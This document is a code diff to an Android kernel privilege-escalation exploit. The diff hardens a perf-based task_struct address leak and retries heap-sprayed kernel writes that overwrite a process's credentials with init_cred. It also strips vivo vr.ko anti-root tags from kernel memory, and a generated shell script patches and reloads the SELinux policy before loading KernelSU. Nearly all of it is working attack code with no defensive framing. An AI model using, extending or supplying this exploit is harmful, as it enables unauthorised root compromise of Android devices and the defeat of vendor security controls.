@@ -81,26 +81,42 @@ static enum soc_family detect_soc(void) {
 
 /* Override struct field offsets (task_struct, etc.) with per-device values */
 #include "runtime_struct_offsets.h"
+/* VR.ko anti-root fallback defines */
+#ifndef VR_TAG_A_OFF
+#define VR_TAG_A_OFF           0x06
+#endif
+#ifndef VR_TAG_B_OFF
+#define VR_TAG_B_OFF           0x2c
+#endif
+#ifndef VR_SYSCALL_TP_FLAG
+#define VR_SYSCALL_TP_FLAG     0x400ULL
+#endif
+#ifndef TASK_THREAD_INFO_FLAGS_OFF
+#define TASK_THREAD_INFO_FLAGS_OFF 0x00
+#endif
 #include "offsets_json.h"
 
 static struct kernel_offsets g_external_offsets;
 static char g_external_release[192];
 
-/* Publish the active entry's init_cred image address and the physical load
- * address (MTK always loads at the DRAM base, text_offset=0). */
+/* Entries carry a phys load address only when measured; otherwise MTK uses
+ * the DRAM base, xring its constant, qcom its GKI version. */
 static void publish_active_offsets(void) {
   g_init_cred_image = INIT_CRED;
+  enum soc_family soc = detect_soc();
+  const char *soc_name =
+      soc == SOC_MTK ? "mtk" : soc == SOC_XRING ? "xring" : "qcom/other";
   if (active_offsets->kernel_phys_load) {
     p0_kernel_phys_load = active_offsets->kernel_phys_load;
-  }
-  enum soc_family soc = detect_soc();
-  const char *soc_name = "qcom/other";
-  if (soc == SOC_MTK) {
+  } else if (soc == SOC_MTK) {
     p0_kernel_phys_load = KIMAGE_TEXT_BASE - MTK_VADDR_BASE;
     soc_name = "mtk";
   } else if (soc == SOC_XRING) {
     p0_kernel_phys_load = XRING_KERNEL_PHYS_LOAD;
     soc_name = "xring";
+  } else if (strncmp(active_offsets->uname_r, "6.12.", 5) == 0) {
+    p0_kernel_phys_load = QC_GKI_6_12_PHYS_LOAD;
+    soc_name = "qcom/6.12";
   }
   pr_info("soc: %s; kernel_phys_load=0x%llx\n",
           soc_name, (unsigned long long)p0_kernel_phys_load);
@@ -482,7 +498,7 @@ static void init_runtime_paths(void) {
 }
 
 static void write_root_script(void) {
-  char script[4096];
+  char script[8192];
   int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
   if (sfd < 0) {
     pr_warning("open root script failed path=%s errno=%d\n",
@@ -500,7 +516,10 @@ static void write_root_script(void) {
       "chmod 644 \"$LOG\" 2>/dev/null\n"
       "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
       "if [ ! -x \"$KSUD\" ]; then\n"
-      "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+      "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu.pr*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+      "fi\n"
+      "if [ ! -x \"$KSUD\" ]; then\n"
+      "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
       "fi\n"
       "if [ ! -x \"$KSUD\" ]; then\n"
       "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
@@ -516,7 +535,10 @@ static void write_root_script(void) {
       "if [ \"$(id -u)\" -ne 0 ]; then\n"
       "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
       "  exit 1\n"
-      "fi\n"
+       "fi\n"
+       "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
+       "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
+       "fi\n"
       "KVER=$(uname -r | cut -d. -f1-2)\n"
       "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
       "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
@@ -525,10 +547,32 @@ static void write_root_script(void) {
       "fi\n"
       "KMI=\"${AVER}-${KVER}\"\n"
       "# step 1: restore policy (W1 already made permissive)\n"
+      "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
+      "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
+      "  exit 1\n"
+      "}\n"
+      "trap 'rm -f \"$POLICY\"' EXIT\n"
+      "prepare_policy() {\n"
+      "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
+      "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
+      "  case \"$HEADER\" in\n"
+      "    8cff7cf9080000005345204c696e7578????????????????) ;;\n"
+      "    *) echo '[!] invalid policy header'; return 1 ;;\n"
+      "  esac\n"
+      "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
+      "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
+      "  [ -n \"$CONFIG\" ] || return 1\n"
+      "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\") || return 1\n"
+      "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
+      "}\n"
       "FIXUP_RC=1\n"
       "for i in $(seq 1 10); do\n"
       "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
-      "  load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1 &\n"
+      "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
+      "    sleep 2\n"
+      "    continue\n"
+      "  fi\n"
+      "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
       "  LPID=$!\n"
       "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
       "  SPID=$!\n"
@@ -654,7 +698,9 @@ static uintptr_t perf_find_task(void) {
         uint64_t *regs = (uint64_t *)p;
         for (int i = 0; i < 32 && nc < 256; i++) {
           uint64_t v = regs[i];
-          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
+          /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
+          v |= 0x0fULL << 56;
+          if (v > 0xffffff8000000000ULL && v < DIRECT_MAP_END)
             cands[nc++] = v;
         }
       }
@@ -675,13 +721,33 @@ static uintptr_t perf_find_task(void) {
 
 struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
 
+/* rooted exits kfree the static init_cred (w2 stores it with no
+ * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
+static void park_rooted_child(void) {
+  FILE *f = fopen("/proc/self/oom_score_adj", "w");
+  if (f) {
+    fputs("-1000", f);
+    fclose(f);
+  }
+  for (;;) pause();
+}
+
 static void child_main(struct child_pipes *p) {
   close(p->task_r); close(p->cmd_w); close(p->uid_r);
   setpgid(0, 0);  /* own group; the parent kills the whole tree on timeout */
   fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* keep the probe pipe out of the
                                           * root shell / ksud chain */
   prctl(PR_SET_NAME, "ghostleaf_0123456789");
+  /* a real leak reproduces, a fluke vote winner does not. w2 writes to
+   * this address, so two runs must agree or the leak is discarded. */
   uintptr_t my_task = perf_find_task();
+  int leak_agreed = 0;
+  for (int i = 0; i < 2 && my_task; i++) {
+    uintptr_t again = perf_find_task();
+    if (again == my_task) { leak_agreed = 1; break; }
+    my_task = again;
+  }
+  if (!leak_agreed) my_task = 0;
   write(p->task_w, &my_task, sizeof(my_task));
   close(p->task_w);
   if (!my_task) _exit(1);
@@ -740,6 +806,12 @@ static void child_main(struct child_pipes *p) {
         ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
       write(p->uid_w, &report, sizeof(report));
     }
+    else if (cmd == 'P') {
+      /* w2 rooted this task; park */
+      close(p->cmd_r);
+      close(p->uid_w);
+      park_rooted_child();
+    }
     else if (cmd == 'G' || cmd == 'X') break;
   }
   close(p->cmd_r);
@@ -759,11 +831,14 @@ static void child_main(struct child_pipes *p) {
     execl("/system/bin/sh", "sh", g_root_script_path, NULL);
     _exit(1);
   }
-  if (worker < 0) { close(p->uid_w); _exit(1); }
-  /* Do not wait: the root shell runs to completion on its own; the parent
-   * polls the app-readable log. */
+  if (worker < 0) {
+    pr_warning("fork() for root shell failed errno=%d; parking rooted child\n", errno);
+    close(p->uid_w);
+    park_rooted_child();
+  }
+  /* the worker holds a fresh cred copy; this task holds the raw init_cred */
   close(p->uid_w);
-  _exit(0);
+  park_rooted_child();
 }
 
 static pid_t spawn_child(struct child_pipes *p) {
@@ -779,6 +854,17 @@ static pid_t spawn_child(struct child_pipes *p) {
   return child;
 }
 
+/* Fork the victim and read back the task pointer perf leaked. */
+static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
+  pid_t child = spawn_child(p);
+  if (child < 0) return -1;
+  uintptr_t task = 0;
+  ssize_t nr = read(p->task_r, &task, sizeof(task));
+  close(p->task_r);
+  *task_out = (nr == (ssize_t)sizeof(task)) ? task : 0;
+  return child;
+}
+
 typedef int (*write_stage_verify_fn)(void *context);
 
 static int retry_write_stage(
@@ -787,6 +873,9 @@ static int retry_write_stage(
     int leaf) {
   for (int attempt = 1; attempt <= attempts; attempt++) {
     pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
+    /* the previous attempt's write can land after its verify read; check
+     * before paying for another heap spray */
+    if (attempt > 1 && verify(context)) return 1;
     if (attempt == 1) slab_drain();
     int routed = do_one_write(target, stage, mode, leaf);
     if (!routed) {
@@ -798,7 +887,8 @@ static int retry_write_stage(
     if (verify(context)) return 1;
     usleep(50000);
   }
-  return 0;
+  /* the last write can land after its verify read */
+  return verify(context);
 }
 
 static int verify_selinux_stage(void *context) {
@@ -933,63 +1023,116 @@ int run_exploit(int argc, char **argv) {
   uintptr_t child_task = 0;
   int child_alive = 1;
   int seccomp_ok = 0;
+  int ever_rooted = 0;
+  pid_t parked_child = -1;
+  int parked_cmd_w = -1;
 
   /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
-   * child, so respawn and redo instead of aborting. */
+   * child, so respawn and redo. */
   for (int round = 1; round <= 3; round++) {
     if (round > 1) {
-      pr_warning("W3 chain retry %d/3: respawning child\n", round);
+      pr_warning("W3 chain retry %d/3: parking rooted child\n", round);
       if (child > 0 && child_alive) {
-        kill(-child, SIGKILL);
-        waitpid(child, NULL, 0);
+        write(pipes.cmd_w, "P", 1);
+        usleep(50000);
+        parked_child = child;
+        parked_cmd_w = pipes.cmd_w;
+      } else {
+        close(pipes.cmd_w);
       }
-      close(pipes.cmd_w); close(pipes.uid_r);
+      close(pipes.uid_r);
       child_alive = 1;
       seccomp_ok = 0;
     }
 
-    child = spawn_child(&pipes);
+    child = spawn_victim(&pipes, &child_task);
     if (child < 0) {
       pr_warning("fork failed\n");
       return 1;
     }
-
-    child_task = 0;
-    read(pipes.task_r, &child_task, sizeof(child_task));
-    close(pipes.task_r);
     TIMER("perf_find_task done");
 
     if (!child_task) {
-      /* perf leaked nothing; respawn and retry once */
-      pr_info("perf returned 0, retrying...\n");
+      /* nothing rooted yet; safe to kill and burn a round */
+      pr_warning("perf leak did not reproduce; retrying next round\n");
+      kill(-child, SIGKILL);
       waitpid(child, NULL, 0);
-      child = spawn_child(&pipes);
-      if (child < 0) { pr_warning("retry fork failed\n"); return 1; }
-      child_task = 0;
-      read(pipes.task_r, &child_task, sizeof(child_task));
-      close(pipes.task_r);
-    }
 
-    if (!child_task) {
-      pr_warning("Cannot find task_struct (perf leak failed)\n");
-      close(pipes.cmd_w);
-      waitpid(child, NULL, 0);
-      return 1;
+      child_alive = 0;
+      close(pipes.cmd_w); close(pipes.uid_r);
+      continue;
+
     }
 
     pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
+    #ifdef VR_TAG_A_OFF
+  /* ------------------------------------------------------------------
+   * vivo vr.ko anti-root per-task bypass (ported from root.c)
+   * ------------------------------------------------------------------
+   * vr.ko tags every app-origin task at fork/clone time. When the task
+   * later holds euid 0, the sys_exit tracepoint probe kills it. We must
+   * strip the tag BEFORE W2 verify runs the child's getuid().
+   *
+   * This exploit primitive is 64-bit granular, so:
+   *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
+   *     clears the VR_SYSCALL_TP_FLAG bit (0x400). This takes the task
+   *     off the sys_exit slow-path immediately.
+   *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
+   *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
+   *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
+   * ------------------------------------------------------------------ */
+  {
+    static int vr_needed = -1;
+    if (vr_needed < 0) {
+      vr_needed = 1; /* /proc/modules unreadable: assume loaded */
+      FILE *m = fopen("/proc/modules", "r");
+      if (m) {
+        char mod[256];
+        vr_needed = 0;
+        while (fgets(mod, sizeof(mod), m))
+          if (!strncasecmp(mod, "vr", 2) && (mod[2] == ' ' || mod[2] == '_'))
+            { vr_needed = 1; break; }
+        fclose(m);
+      }
+      pr_info("vr.ko %s\n", vr_needed ? "loaded; clearing tags"
+                                      : "not loaded; skipping tag clear");
+    }
+
+    int vr_ok = 1;
+    if (vr_needed) {
+      /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+      vr_ok &= do_one_write(child_task + TASK_THREAD_INFO_FLAGS_OFF,
+                            "VR: flags+tagA", 1, 1);
+
+      /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
+      if (vr_ok) {
+        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
+        vr_ok &= do_one_write(tagb_align, "VR: tagB", 1, 1);
+      }
+
+      if (vr_ok) {
+        pr_success("VR.ko per-task tags cleared\n");
+      } else {
+        pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
+      }
+    }
+  }
+#endif
+
     pselect_child_node = 1;
 
     int got_root = retry_write_stage(
-        "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 50000,
+        "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 100000,
         verify_w2_stage, &w2_context, 0);
     if (!got_root) {
       write(pipes.cmd_w, "X", 1);
       close(pipes.cmd_w); close(pipes.uid_r);
       pr_warning("W2 failed after 15 rounds\n");
-      waitpid(child, NULL, 0);
+      waitpid(child, NULL, WNOHANG);
       return 1;
     }
+    ever_rooted = 1;
+    /* rooted children never exit; chain failures park (P) */
 
     /* W3: clear the child's seccomp filter for the independent root shell
      * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
@@ -1068,29 +1211,24 @@ int run_exploit(int argc, char **argv) {
 
   sleep(2);
   TIMER("exploit complete");
+  if (!ever_rooted) {
+    pr_error("w2 never rooted a child\n");
+    return 1;
+  }
   if (child_alive) {
     if (write(pipes.cmd_w, "G", 1) != 1)
       pr_warning("failed to start root shell (child exited early)\n");
+    close(pipes.cmd_w);
+    waitpid(child, NULL, WNOHANG);
+    if (parked_cmd_w >= 0) close(parked_cmd_w);
+  } else if (parked_child > 0) {
+    if (write(parked_cmd_w, "G", 1) != 1)
+      pr_warning("failed to start root shell (parked child exited)\n");
+    close(parked_cmd_w);
+    waitpid(parked_child, NULL, WNOHANG);
+    parked_cmd_w = -1;
   } else {
     pr_warning("skipping late-load: child died during W3\n");
-  }
-  close(pipes.cmd_w);
-  if (child_alive) {
-    /* The child only forks the independent root shell and exits fast; keep
-     * a bounded wait in case it got stuck before the fork. */
-    int waited_ms = 0;
-    for (;;) {
-      pid_t r = waitpid(child, NULL, WNOHANG);
-      if (r == child || r < 0) break;
-      if (waited_ms >= 45000) {
-        pr_warning("child stuck before root shell handoff; killing group\n");
-        kill(-child, SIGKILL);
-        waitpid(child, NULL, 0);
-        break;
-      }
-      usleep(100000);
-      waited_ms += 100;
-    }
   }
   close(pipes.uid_r);
 
@@ -1109,7 +1247,9 @@ int run_exploit(int argc, char **argv) {
     if (lf) {
       char line[256];
       while (fgets(line, sizeof(line), lf)) {
-        if (strstr(line, "[+] KernelSU module loaded")) ksu_log_loaded = 1;
+        if (strstr(line, "[+] KernelSU module loaded") ||
+            strstr(line, "[+] KernelSU already loaded"))
+          ksu_log_loaded = 1;
         if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
       }
       fclose(lf);
